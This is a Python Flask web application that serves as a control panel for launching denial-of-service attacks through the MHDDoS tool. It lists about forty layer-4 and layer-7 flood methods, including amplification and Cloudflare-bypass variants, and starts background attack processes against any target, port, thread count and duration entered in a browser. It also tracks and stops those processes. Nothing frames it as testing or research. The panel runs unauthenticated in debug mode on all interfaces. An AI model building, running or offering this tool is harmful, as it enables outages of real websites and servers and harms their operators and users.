#!/usr/bin/env python3

from flask import Flask, render_template, request, jsonify, redirect, url_for
import subprocess
import threading
import time
import json
import os
from datetime import datetime
import signal
import psutil

app = Flask(__name__)

# Global variables to track running attacks
running_attacks = {}
attack_counter = 0

# MHDDoS methods from start.py
LAYER4_METHODS = [
    "TCP", "UDP", "SYN", "VSE", "TS3", "MCPE", "FIVEM", "MINECRAFT", 
    "CPS", "CONNECTION", "MCBOT", "ICMP", "MEM", "NTP", "DNS", "ARD", 
    "CLDAP", "CHAR", "RDP"
]

LAYER7_METHODS = [
    "CFB", "BYPASS", "GET", "POST", "OVH", "STRESS", "DYN", "SLOW", 
    "HEAD", "NULL", "COOKIE", "PPS", "EVEN", "GSB", "DGB", "AVB", 
    "CFBUAM", "APACHE", "XMLRPC", "BOT", "BOMB", "DOWNLOADER", 
    "KILLER", "TOR", "RHEX", "STOMP"
]

@app.route('/')
def dashboard():
    return render_template('dashboard.html', 
                         layer4_methods=LAYER4_METHODS,
                         layer7_methods=LAYER7_METHODS,
                         running_attacks=running_attacks)

@app.route('/start_attack', methods=['POST'])
def start_attack():
    global attack_counter
    
    data = request.get_json()
    attack_type = data.get('attack_type')  # 'layer4' or 'layer7'
    method = data.get('method')
    target = data.get('target')
    port = data.get('port', '80')
    duration = int(data.get('duration', 60))
    threads = int(data.get('threads', 1))
    rpc = int(data.get('rpc', 1))
    proxy_type = int(data.get('proxy_type', 0))
    
    attack_id = f"attack_{attack_counter}"
    attack_counter += 1
    
    # Build command based on attack type
    if attack_type == 'layer4':
        cmd = ['python3', 'start.py', method, f"{target}:{port}", str(threads), str(duration)]
    else:  # layer7
        cmd = ['python3', 'start.py', method, target, str(proxy_type), str(threads), 'proxies.txt', str(rpc), str(duration)]
    
    # Start attack in background
    try:
        process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        
        attack_info = {
            'id': attack_id,
            'type': attack_type,
            'method': method,
            'target': target,
            'port': port,
            'duration': duration,
            'threads': threads,
            'start_time': datetime.now().strftime('%H:%M:%S'),
            'end_time': (datetime.now().timestamp() + duration),
            'process': process,
            'status': 'running'
        }
        
        running_attacks[attack_id] = attack_info
        
        # Start monitoring thread
        monitor_thread = threading.Thread(target=monitor_attack, args=(attack_id,))
        monitor_thread.daemon = True
        monitor_thread.start()
        
        return jsonify({'success': True, 'attack_id': attack_id})
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})

@app.route('/stop_attack/<attack_id>')
def stop_attack(attack_id):
    if attack_id in running_attacks:
        attack = running_attacks[attack_id]
        try:
            # Kill the process
            process = attack['process']
            process.terminate()
            
            # Kill child processes
            try:
                parent = psutil.Process(process.pid)
                children = parent.children(recursive=True)
                for child in children:
                    child.terminate()
            except:
                pass
            
            attack['status'] = 'stopped'
            return jsonify({'success': True})
        except Exception as e:
            return jsonify({'success': False, 'error': str(e)})
    return jsonify({'success': False, 'error': 'Attack not found'})

@app.route('/stop_all_attacks')
def stop_all_attacks():
    for attack_id in list(running_attacks.keys()):
        stop_attack(attack_id)
    return jsonify({'success': True})

@app.route('/get_attacks')
def get_attacks():
    # Clean up finished attacks
    current_time = datetime.now().timestamp()
    for attack_id in list(running_attacks.keys()):
        attack = running_attacks[attack_id]
        if attack['status'] == 'running' and current_time > attack['end_time']:
            attack['status'] = 'finished'
    
    return jsonify(running_attacks)

def monitor_attack(attack_id):
    """Monitor attack process and update status"""
    if attack_id in running_attacks:
        attack = running_attacks[attack_id]
        process = attack['process']
        
        # Wait for process to complete
        process.wait()
        
        # Update status
        if attack_id in running_attacks:
            running_attacks[attack_id]['status'] = 'finished'

if __name__ == '__main__':
    app.run(debug=True, host='0.0.0.0', port=5000)
